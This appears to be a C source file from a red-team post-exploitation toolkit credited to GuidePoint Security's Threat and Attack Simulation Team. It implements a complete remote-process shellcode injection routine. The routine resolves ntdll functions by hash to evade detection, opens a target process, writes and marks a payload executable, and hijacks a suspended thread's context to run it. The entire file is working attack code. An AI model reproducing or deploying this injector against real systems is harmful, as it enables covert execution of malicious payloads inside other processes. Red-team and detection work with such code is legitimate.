/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

VOID
NTAPI
RtlUserThreadStart( VOID );

typedef struct
{
	D_API( NtAllocateVirtualMemory );
	D_API( NtProtectVirtualMemory );
	D_API( RtlUserThreadStart );
	D_API( NtGetContextThread );
	D_API( NtSetContextThread );
	D_API( NtCreateThreadEx );
	D_API( NtResumeThread );
	D_API( NtOpenProcess );
	D_API( NtContinue );
	D_API( NtClose );
} API ;

/* API Hashes */
#define H_API_NTALLOCATEVIRTUALMEMORY	0xf783b8ec /* NtAllocateVirtualMemory */
#define H_API_NTPROTECTVIRTUALMEMORY	0x50e92888 /* NtProtectVirtualMemory */
#define H_API_RTLUSERTHREADSTART	0x0353797c /* RtlUserThreadStart */
#define H_API_NTGETCONTEXTTHREAD	0x6d22f884 /* NtGetContextThread */
#define H_API_NTSETCONTEXTTHREAD	0xffa0bf10 /* NtSetContextThread */	
#define H_API_NTCREATETHREADEX		0xaf18cfb0 /* NtCreateThreadEx */
#define H_API_NTRESUMETHREAD		0x5a4bc3d0 /* NtResumeThread */
#define H_API_NTOPENPROCESS		0x4b82f718 /* NtOpenProcess */
#define H_API_NTCONTINUE		0xfc3a6c2c /* NtContinue */
#define H_API_NTCLOSE			0x40d6e69d /* NtClose */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Injects the target process with the specified 
 * payload.
 *
!*/
D_SEC( A ) DWORD __cdecl Entry( _In_ DWORD Pid, _In_ DWORD Offset, _In_ PVOID Buffer, _In_ DWORD Length )
{
	API			Api;
	CONTEXT			Ctx;
	CLIENT_ID		Cid;
	OBJECT_ATTRIBUTES	Att;

	ULONG			Prt = 0;
	SIZE_T			Len = Length;

	PVOID			Adr = NULL;
	HANDLE			Thd = NULL;
	HANDLE			Prc = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );

	Api.NtAllocateVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALLOCATEVIRTUALMEMORY ); 
	Api.NtProtectVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTPROTECTVIRTUALMEMORY );
	Api.RtlUserThreadStart      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLUSERTHREADSTART );
	Api.NtGetContextThread      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTGETCONTEXTTHREAD );
	Api.NtSetContextThread      = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTSETCONTEXTTHREAD );
	Api.NtCreateThreadEx        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCREATETHREADEX ); 
	Api.NtResumeThread          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTRESUMETHREAD );
	Api.NtOpenProcess           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTOPENPROCESS );
	Api.NtContinue              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCONTINUE );
	Api.NtClose                 = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTCLOSE );

	Cid.UniqueProcess = C_PTR( Pid );
	InitializeObjectAttributes( &Att, NULL, 0, NULL, NULL );

	/* Open up the target process to create threads within. */
	if ( NT_SUCCESS( Api.NtOpenProcess( &Prc, PROCESS_ALL_ACCESS, &Att, &Cid ) ) ) {

		/* Allocate a block of memory! :) */
		if ( NT_SUCCESS( Api.NtAllocateVirtualMemory( Prc, &Adr, 0, &Len, MEM_COMMIT, PAGE_READWRITE ) ) ) {

			/* Write a bblock of memory using thread trick! */
			WriteRemoteMemory( Prc, Adr, Buffer, Length );

			/* Set the region of memory to a PAGE_EXECUTE_READ */
			if ( NT_SUCCESS( Api.NtProtectVirtualMemory( Prc, &Adr, &Len, PAGE_EXECUTE_READ, &Prt ) ) ) {

				/* Create a thread pointing at a region to target */
				if ( NT_SUCCESS( Api.NtCreateThreadEx( &Thd, THREAD_ALL_ACCESS, NULL, Prc, Api.RtlUserThreadStart, NULL, TRUE, 0, 0x1000 * 10, 0, NULL ) ) ) {

					Ctx.ContextFlags = CONTEXT_FULL;

					/* Get the current context! */
					if ( NT_SUCCESS( Api.NtGetContextThread( Thd, &Ctx ) ) ) {

						Ctx.ContextFlags = CONTEXT_FULL;

					#if defined( _WIN64 )
						Ctx.Rip = U_PTR( Adr );
					#else
						Ctx.Eip = U_PTR( Adr );
					#endif

						/* Set the new remote context! */
						if ( NT_SUCCESS( Api.NtSetContextThread( Thd, &Ctx ) ) ) {

							/* Resume the remote thread! */
							if ( NT_SUCCESS( Api.NtResumeThread( Thd, NULL ) ) ) {
							};
						};
					};
				};
			}; 
		};
		/* Close Reference! */
		Api.NtClose( Prc );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
	RtlSecureZeroMemory( &Cid, sizeof( Cid ) );
	RtlSecureZeroMemory( &Att, sizeof( Att ) );
};
